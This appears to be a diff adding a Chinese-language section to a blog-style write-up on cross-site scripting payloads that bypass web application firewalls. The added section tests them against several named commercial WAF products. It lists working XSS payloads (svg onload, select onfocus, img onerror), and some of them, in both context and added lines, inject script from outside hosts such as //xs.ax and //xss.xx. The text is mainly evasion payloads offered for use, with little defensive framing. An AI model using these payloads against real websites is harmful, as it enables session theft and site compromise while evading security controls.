@@ -50,3 +50,45 @@ phpStudy2016(PHP-5.4.45+Apache)
 <audio %26%2362 src=x  onerror=alert`1`>
 <svg %26%2362 onload=appendChild(createElement('script')).src='//xs.ax/HfcB'>
 ```
+
+该文章在最后说明此方法可以绕过多款waf，接下来我们来测试。
+
+`云锁`：
+
+![5.png](https://ae01.alicdn.com/kf/Ua781c4541fce4d9287ddc4218025ee49L.png)
+
+绕过
+```
+<svg %26%2362 onload=alert`1`>
+```
+
+`奇安信CDN`：
+
+拦截
+```
+<svg %26%2362 onload=alert`1`>
+```
+![7.png](https://ae01.alicdn.com/kf/Ua119486efcd94f83881e7135b9aa13daX.png)
+
+绕过方法(使用HTML5新标签)
+
+`<select autofocus onfocus=[2].find(alert)>`
+
+`安全狗`：
+
+绕过
+![8.png](https://ae01.alicdn.com/kf/U75a996f4667944d2895372a9eb417a07U.png)
+
+`阿里云`：
+
+拦截
+![9.png](https://ae01.alicdn.com/kf/U59c6226bba53437a9ee15b9d3e5f70e1w.png)
+
+绕过方法(这个百度下就有)
+```
+<img src=# onerror=alert`2`>
+<input onfocus="document.body.appendChild(createElement('script')).src='//xss.xx/B6Bb'" autofocus>
+```
+
+![10.png](https://ae01.alicdn.com/kf/U3d07d821e85a4a028b8eb360e7c78a04X.png)
+
